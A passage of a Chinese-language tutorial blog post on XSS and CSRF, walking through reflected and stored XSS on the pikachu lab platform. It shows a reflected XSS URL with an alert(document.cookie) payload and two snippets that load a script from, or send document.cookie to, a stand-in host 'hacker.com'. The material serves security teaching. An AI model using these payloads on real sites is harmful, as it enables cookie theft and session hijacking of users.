---
title: XSS和CSRF的区别及防御
date: 2022-03-08 16:49:20
tags:
---

在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。

<!-- more -->

介绍之前，先上下维基百科：

- XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

- CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

## XSS

用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。

XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。

### 反射型

反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面）

流程图如下：

{% img /gallery/react+ts.png %}

通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—>别的用户访问这个URL—>恶意代码被服务器解析—>传递给前端渲染实现攻击。

> 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它

[pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html：

{% img /gallery/xss-1.jpg %}

可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？

{% img /gallery/xss-2.jpg %}

{% img /gallery/xss-3.jpg %}

脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&submit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。

现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。

```html
<script src="http://hacker.com/hacker.js"></script>
```

```javascript
var img = new Image();
img.src = "http://hacker.com/hack.png?q=" + document.cookie;
document.body.append(img);
```

### 存储型

存储型 XSS 会把用户输入的数据 "存储" 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。

反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。

比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。

流程图如下：

{% img /gallery/xss-storage.jpg %}

通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—>后端不做处理传入数据库—>别的用户访问页面—>后端从数据库中调用XSS代码—>前端渲染(执行js脚本)恶意代码实现攻击。

这里还是用 [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu) 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本：

{% img /gallery/xss-4.jpg %}

提交后并刷新页面，这段脚本被注入到 html 中，并执行了

